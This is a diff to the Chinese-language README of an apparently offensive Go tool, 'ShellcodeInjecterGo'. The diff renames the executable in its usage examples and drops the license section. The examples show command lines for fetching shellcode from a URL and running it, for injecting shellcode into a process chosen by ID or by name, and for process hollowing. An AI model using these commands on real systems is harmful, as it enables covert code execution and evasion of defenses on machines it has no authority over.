@@ -57,22 +57,22 @@ go build -o ShellcodeInjecterGo.exe
 
 1. 从URL加载shellcode并直接执行：
 ```bash
-shellcode-runner.exe -u http://example.com/shellcode.bin -debug
+ShellcodeInjecterGo.exe -u http://example.com/shellcode.bin -debug
 ```
 
 2. 通过进程ID注入shellcode：
 ```bash
-shellcode-runner.exe -f shellcode.bin -p 1234
+ShellcodeInjecterGo.exe -f shellcode.bin -p 1234
 ```
 
 3. 通过进程名称注入shellcode：
 ```bash
-shellcode-runner.exe -f shellcode.bin -n "notepad.exe"
+ShellcodeInjecterGo.exe -f shellcode.bin -n "notepad.exe"
 ```
 
 4. 进程镂空执行：
 ```bash
-shellcode-runner.exe -f shellcode.bin -e "C:\Windows\notepad.exe"
+ShellcodeInjecterGo.exe -f shellcode.bin -e "C:\Windows\notepad.exe"
 ```
 
 ## 技术实现细节
@@ -148,10 +148,6 @@ shellcode-runner.exe -f shellcode.bin -e "C:\Windows\notepad.exe"
 3. 提交您的改动
 4. 推送到您的分支
 5. 提交Pull Request
-
-## 许可证
-
-本项目采用MIT许可证 - 详见 [LICENSE](LICENSE) 文件
 
 ## 免责声明
 
